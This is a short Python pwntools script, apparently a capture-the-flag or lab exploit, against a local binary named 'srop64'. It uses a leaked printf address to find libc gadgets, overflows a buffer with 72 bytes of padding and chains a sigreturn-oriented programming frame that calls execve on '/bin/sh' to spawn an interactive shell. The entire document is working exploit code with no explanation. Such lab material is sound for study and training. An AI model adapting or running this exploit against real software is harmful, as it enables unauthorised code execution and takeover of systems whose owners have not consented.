from pwn import *
context.arch = "amd64"

binary = ELF('./srop64')
p = process(binary.path)

p.recvuntil('Printf() address : ')
stackAddr = p.recvuntil('\n')
stackAddr = int(stackAddr,16)

#You need to change the value to match the environment you are testing.
libcBase = stackAddr - 0x55800
binsh = libcBase + 0x18cd57
syscall = libcBase + 0xbc375
poprax = libcBase + 0x33544
  
print hex(libcBase)
print hex(binsh)
print hex(syscall)
print hex(poprax)
 
exploit = ''
exploit += "\x90" * 72
exploit += p64(poprax)
exploit += p64(0xf)
exploit += p64(syscall)
 
frame = SigreturnFrame(arch="amd64")
frame.rax = 0x3b
frame.rdi = binsh
frame.rsp = syscall
frame.rip = syscall
 
exploit += str(frame)
 
p.send(exploit)
p.interactive()
